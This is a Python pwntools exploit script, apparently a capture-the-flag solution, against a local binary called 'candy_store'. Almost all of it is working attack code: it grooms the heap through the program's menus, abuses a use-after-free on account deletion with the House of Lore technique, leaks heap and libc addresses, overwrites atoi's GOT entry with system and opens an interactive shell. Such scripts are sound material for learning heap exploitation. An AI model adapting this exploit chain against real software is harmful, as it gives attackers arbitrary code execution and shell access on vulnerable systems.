# UAF when deleting an account + House of Lore + atoi => system

from pwn import *

def menu(choice):
	r.sendlineafter('Command : ', str(choice))

def stock():
	menu(1)

def charge(option):
	menu(3)
	r.sendlineafter('100000\n', str(option))

def register():
	r.sendafter('> ', p64(0xb00bface))
	r.sendafter('> ', p64(0xb00bface))
	r.sendlineafter('No\n', '0')

def create_account(name, passwd, profile):
	r.sendafter('> ', p64(0xb00bface))
	r.sendafter('> ', p64(0xb00bface))
	r.sendlineafter('No\n', '0')
	r.sendlineafter('ID.\n', name)
	r.sendlineafter('Password.\n', passwd)
	r.sendlineafter('profile.\n', profile)

orders = 0

def order():
	menu(4)

def add(code):
	global orders
	orders += 1
	order()
	r.sendlineafter('Command : ', '2')
	r.sendlineafter('>', str(code))
	r.sendlineafter('Command : ', '5')

def set_price(price):
	r.sendlineafter('candy.\n', str(price))

def set_price_v2():
	r.sendafter('candy.\n', '')

def set_desc(desc):
	r.sendafter('candy.\n', desc)

def order_candies(desc='A'*8):
	global orders
	menu(4)
	r.sendlineafter('Command : ', '4')
	r.sendline('0')

	for _ in xrange(orders):
		set_price(0x10)
		set_desc(desc)
	r.sendlineafter('Command : ', '5')

def order_candies_v2(desc='A'*8):
	global orders
	menu(4)
	r.sendlineafter('Command : ', '4')
	r.sendline('0')

	for _ in xrange(orders):
		set_price_v2()
		set_desc(desc)
	r.sendlineafter('Command : ', '5')

def buy(item, amount, comment='kek'):
	menu(2)
	r.sendlineafter('purchased.\n', str(item))
	r.sendlineafter('purchase.\n', str(amount))
	r.sendlineafter('candy.\n', comment)

def cancel(code):
	order()
	r.sendlineafter('Command : ', '3')
	r.sendline(str(code))
	r.sendlineafter('Command : ', '5')

def login(user, password):
	r.sendlineafter('> ', user)
	r.sendlineafter('> ', password)

def logout():
	menu(9)
	r.sendlineafter('No\n', '0')

def delete_account(acc):
	menu(5)
	r.sendlineafter('Command : ', '1')
	r.sendlineafter('delete\n', str(acc))
	r.sendlineafter('Command : ', '3')

def change_pw(acc, data):
	menu(5)
	r.sendlineafter('Command : ', '2')
	r.sendlineafter('PW\n', str(acc))
	r.sendafter('Password.\n', data)
	r.sendlineafter('Command : ', '3')

def leak():
	stock()
	r.recvuntil('A'*8)
	heap_leak = u64(r.recv(3).ljust(8, chr(0)))
	r.recvuntil('A'*8)
	libc_leak = u64(r.recv(6).ljust(8, chr(0)))
	return heap_leak, libc_leak

def pwn():

	login('Admin\x00', 'admin\x00')

	for _ in xrange(10):
		charge(5)

	logout()
	
	create_account('KEK\x00', 'kek\x00', 'lel')
	login('KEK\x00', 'kek\x00')

	logout()
	login('Admin\x00', 'admin\x00')

	for _ in xrange(3):
		add(8)

	logout()
	create_account('LEL\x00', 'lel\x00', 'lel')
	login('Admin\x00', 'admin\x00')

	for _ in xrange(3):
		add(8)

	# cancel an item in the middle (0x6056d0) so that when order_candies()
	# is called, the 0x20 and 0x90 chunk are not ajdacent (the 0x90
	# will be taken from the top chunk) to prevent it from consolidating
	# when purchasing an item
	cancel(3)
	
	order_candies()

	# patch heap holes plus one (7 in total) to prevent
	# the cart[0].description from consolidating
	# with the top chunk when purchase() is called
	# this time we don't add the same item in the list
	# because when ordering candies there is a check where
	# if the selected item has already been in the cart,
	# it won't make a new allocation, which we need two allocations
	# to leak both libc and heap
	for i in xrange(6):
		add(i)
	# free an item -- you'll see why
	cancel(3)

	delete_account(2)
	
	buy(0, 50, p64(0x604260)*10)

	order_candies()
	
	# at this pointer we have two 0x90 smallbin chunks pointing
	# to each other, meaning we can leak libc and heap with the next two orders
	heap, libc = leak()
	libc -= 0x3c4bf8
	system = libc + 0x45390
	heap -= 0x7c0
	fake_chunk = heap + 0x870

	log.success('Libc: 0x{:x}'.format(libc))
	log.success('Heap: 0x{:x}'.format(heap))

	# patch heap holes
	for i in xrange(5):
		add(i)

	# free up cart space
	buy(4, 10)
	buy(2, 10)

	for _ in xrange(4):
		add(2)
	
	delete_account(3)

	order_candies(p64(0xdeadbeef)*10)

	for i in xrange(6):
		add(i)

	cancel(4)
	cancel(0)
	cancel(2)

	buy(3, 40)

	change_pw(3, p64(0x604260))

	# return the bss chunk that belongs to the 3rd account entry
	# we can overwrite the original pointer with a GOT entry
	# and return to system by changing the password again
	atoi_got = 0x604098
	order_candies_v2(p64(atoi_got - 0x18))

	# atoi => system
	change_pw(3, p64(system))

	r.sendlineafter('Command : ', 'sh')

	r.interactive()

if __name__ == "__main__":
	r = process('./candy_store')
	pause()
	pwn()
